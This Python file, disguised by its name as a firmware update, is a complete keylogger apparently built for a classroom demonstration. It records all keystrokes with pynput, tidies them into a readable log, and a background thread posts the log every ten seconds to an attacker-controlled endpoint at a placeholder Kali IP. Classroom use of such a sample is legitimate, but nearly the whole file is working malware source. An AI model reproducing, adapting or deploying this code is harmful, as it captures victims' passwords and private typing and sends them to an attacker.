# firmware_update.py
from pynput import keyboard
import threading
import tkinter as tk
import webbrowser
import requests
import time

log = ""

# Function to show GUI window for demo/test purposes
def show_window():
    def update_textbox():
        textbox.delete(1.0, tk.END)
        textbox.insert(tk.END, log)
        textbox.after(500, update_textbox)

    root = tk.Tk()
    root.title("DEMO_FEEDBACK_CONSOLE")
    root.geometry("200x150")

    textbox = tk.Text(root, height=20, width=80)
    textbox.pack()

    update_textbox()
    root.mainloop()

# Function to run keylogger.. first steps!
def on_press(key):
    global log
    
    # Changes the log output from [Key.space] to an actual space to make keylogged info look more clear and readable
    if key == keyboard.Key.space:
        log += " "
        return
    # Black list to stop these keys from clogging up the output for keylogged info.
    blacklist = {
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
        keyboard.Key.alt,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.tab,
        keyboard.Key.left,
        keyboard.Key.right,
        keyboard.Key.up,
        keyboard.Key.down,
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.num_lock,
        keyboard.Key.cmd,
        keyboard.Key.delete,
        keyboard.Key.print_screen,
        keyboard.Key.pause,
        keyboard.Key.scroll_lock,
        keyboard.Key.end,
        keyboard.Key.page_down,
        keyboard.Key.page_up,
        keyboard.Key.insert,
        keyboard.Key.home,
        keyboard.Key.backspace
    }

    if key in blacklist:
        return  # Ignore blacklisted keys

    try:
        log += key.char # Appends Character value
    except AttributeError: # catches special keys that dont have .char attribute
        log += f'[{key}]' # log special keys (e.g enter = [Key.enter])

# Send logs to fake site from Kali machine
def send_logs():
    global log
    while True:
        if log.strip():
            try:
                requests.post("http://[Attacker_local_IP]/log.php", data=log) # MAKE SURE YOU CHANGE TO YOUR KALI IP
                log = ""  # Clear after sending
            except:
                pass
        time.sleep(10)  # Wait 10 seconds between uploads

# Start threads
t1 = threading.Thread(target=show_window) # Creates a thread for a GUI window for presentation Demo to show the class, give them something to look at
t2 = keyboard.Listener(on_press=on_press) # keyboard event listener using pynput.keyboard
t3 = threading.Thread(target=send_logs) # Creates thread for sending logs function to send data to Kali 

t1.start() # GUI start
t2.start() # Keylog start
t3.daemon = True # Quietly runs in background....but closes when main program window is closed....used to easily close program for demonstration purposes
t3.start() # Send logs start

t1.join() # wait to exit
t2.join() # ^ what he said
